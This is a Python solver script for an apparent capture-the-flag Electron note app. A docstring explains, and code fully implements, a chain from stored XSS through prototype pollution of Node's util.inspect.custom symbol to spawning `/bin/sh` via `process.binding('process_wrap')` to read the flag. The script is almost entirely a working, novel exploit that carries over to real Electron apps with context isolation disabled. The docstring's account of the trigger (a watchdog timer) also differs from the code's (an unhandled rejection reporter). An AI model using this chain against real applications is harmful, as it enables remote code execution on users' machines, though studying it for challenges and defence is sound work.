#!/usr/bin/env python3
"""
NativeNote — exploit / solver
==============================

Vulnerability chain
-------------------
1. `note.html` renders user content with `{{ content | safe }}` → unescaped
   HTML in the Electron admin viewer → XSS in the renderer process.

2. The Electron BrowserWindow is built with:
       contextIsolation: false      ← renderer + preload share one V8 heap
       sandbox: false
       nodeIntegration: false
   so any prototype mutation in the renderer also affects every object
   created on the preload side.

3. The preload itself never exposes a Node-side primitive on `window`.
   The only Node bridge is `noteAPI.ping()` (an unhandled IPC channel),
   which is useless for RCE.

   But the preload runs a `setInterval(...)` watchdog that, every second,
   calls `util.inspect(snapshot, { depth: 2 })` where the snapshot object
   has `proc: process` as one of its own properties.  That `util.inspect`
   call walks into `process` — and on every recursion, Node looks up the
   `Symbol.for('nodejs.util.inspect.custom')` key on the value via a
   plain prototype-walked property access.

The novel gadget: Object.prototype[util.inspect.custom]
-------------------------------------------------------
Node's `lib/internal/util/inspect.js` (paraphrased):

    function formatValue(ctx, value, recurseTimes, typedArray) {
        ...
        if (ctx.customInspect) {
            const maybeCustom = value[customInspectSymbol];   // ← prototype walk
            if (typeof maybeCustom === 'function' &&
                    maybeCustom !== inspect &&
                    !(value.constructor &&
                      value.constructor.prototype === value)) {
                const ret = maybeCustom.call(value, ...);     // ← `this` = value
                ...
            }
        }
        ...
    }

`Symbol.for('nodejs.util.inspect.custom')` is in the GLOBAL Symbol registry,
so the renderer can produce the same Symbol value Node uses internally.
Defining a value for that key on `Object.prototype` means *every*
`util.inspect(x)` call hijacks `x[customInspectSymbol]` to our function —
called with `this = x`.

When the watchdog inspects its snapshot, the recursive walk eventually
calls `formatValue(ctx, process, ...)`. Our hook fires with `this = process`
— full Node access from a renderer-realm function with no `noteAPI` call,
no `execFile`, no ChildProcess construction.

From `this = process`:
    process.binding('process_wrap').Process

is the same native class Node's own ChildProcess constructor uses
(`internalBinding('process_wrap').Process`).  We instantiate it and call
`.spawn({...})` directly — no `child_process` module required.

Why this is more interesting
----------------------------
  * Trigger is **fully automatic** — the renderer XSS sets the pollution
    and waits for the next 1 s watchdog tick.  No `noteAPI.*` call,
    no `execFile`, no ChildProcess construction.
  * The hook key is a **well-known global Symbol**, not a string slot —
    `Symbol.for('nodejs.util.inspect.custom')` is documented Node API,
    not an internal bookkeeping name.
  * Setter-`this` is the **`process` object itself**, reached by Node
    walking the prototype chain during a routine `console`-style call.
  * Spawning goes through `process.binding('process_wrap')` directly —
    we never touch `require('child_process')`, never construct a
    `ChildProcess`, and never trip any of the well-published
    `_handle` / `spawnfile` / `onexit` / `pid` setters.

Usage
-----
  python3 solve.py http://localhost:8080
"""

import sys
import time
import textwrap
import requests

TARGET = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else 'http://localhost:8080'

s = requests.Session()

# ── 1. Register + login ───────────────────────────────────────────────────

CREDS = {'username': 'solver_x7k2', 'password': 'S3cur3P@ss!'}
s.post(f'{TARGET}/register', data=CREDS)
r = s.post(f'{TARGET}/login', data=CREDS)
assert 'notes' in r.url or r.ok, 'Login failed'
print('[+] Logged in')

# ── 2. Create output placeholder note (its ID is the exfil filename) ──────

r = s.post(f'{TARGET}/note/new',
           data={'title': 'output', 'content': ''},
           allow_redirects=False)
output_id = r.headers['Location'].rsplit('/', 1)[-1]
print(f'[+] Output note ID: {output_id}')

# ── 3. Build exploit payload ──────────────────────────────────────────────

CMD = f'cat /flag > /tmp/notes_output/{output_id}.html'

exploit_js = textwrap.dedent(f"""\
    (() => {{
        const CMD = {repr(CMD)};
        const customInspect = Symbol.for('nodejs.util.inspect.custom');
        let fired = false;

        // Hijack Object.prototype[util.inspect.custom].
        //
        // Node's util.inspect, for any value it formats, performs
        //     value[Symbol.for('nodejs.util.inspect.custom')]
        // — a plain prototype-walked property access. Installing our
        // function there means every util.inspect call invokes us with
        // `this` set to the value being inspected.
        Object.defineProperty(Object.prototype, customInspect, {{
            configurable: true,
            value: function () {{
                // Act only when `this` is the Node `process` object —
                // it's the one carrying the native `binding` / `dlopen`
                // methods that ordinary objects don't have.
                if (!fired && this !== null && typeof this === 'object' &&
                        typeof this.binding === 'function' &&
                        typeof this.dlopen  === 'function') {{
                    fired = true;
                    try {{
                        // Same native class Node's own ChildProcess uses:
                        //   internalBinding('process_wrap').Process
                        const Process = this.binding('process_wrap').Process;
                        new Process().spawn({{
                            file: '/bin/sh',
                            args: ['sh', '-c', CMD],
                            stdio: [
                                {{type: 'ignore'}},
                                {{type: 'ignore'}},
                                {{type: 'ignore'}},
                            ],
                            envPairs: ['PATH=/usr/bin:/bin'],
                            cwd: '/',
                            windowsHide: false,
                            detached: false,
                        }});
                    }} catch (_) {{}}
                }}
                // Return `this` so util.inspect treats `ret === context`
                // and falls through to default property-walking — that's
                // how the recursion eventually reaches `runtime: process`
                // and re-invokes us with `this = process`.
                return this;
            }},
        }});

        // Fire the preload's crash reporter. noteAPI.ping() rejects
        // (no IPC handler in main) — leaving it un-caught becomes an
        // unhandledrejection event, which the preload reports through
        // util.inspect({{ runtime: process, ... }}). The recursion walks
        // into `process` and our hook fires.
        window.noteAPI.ping();
    }})();
""")

exploit_content = f'<script>\n{exploit_js}\n</script>'

r = s.post(f'{TARGET}/note/new',
           data={'title': 'pwn', 'content': exploit_content},
           allow_redirects=False)
exploit_id = r.headers['Location'].rsplit('/', 1)[-1]
print(f'[+] Exploit note ID: {exploit_id}')

# ── 4. Report the exploit note to the admin bot ───────────────────────────

s.post(f'{TARGET}/report', data={'id': exploit_id})
print('[+] Reported — waiting for bot (~25s)…')

# ── 5. Poll for output ────────────────────────────────────────────────────

for attempt in range(30):
    time.sleep(1)
    r = s.get(f'{TARGET}/out/{output_id}.html')
    if r.status_code == 200 and r.text.strip():
        print(f'\n[!] FLAG: {r.text.strip()}')
        break
    print(f'  waiting… ({attempt+1})', end='\r')
else:
    print('\n[-] Timed out — flag not found.')
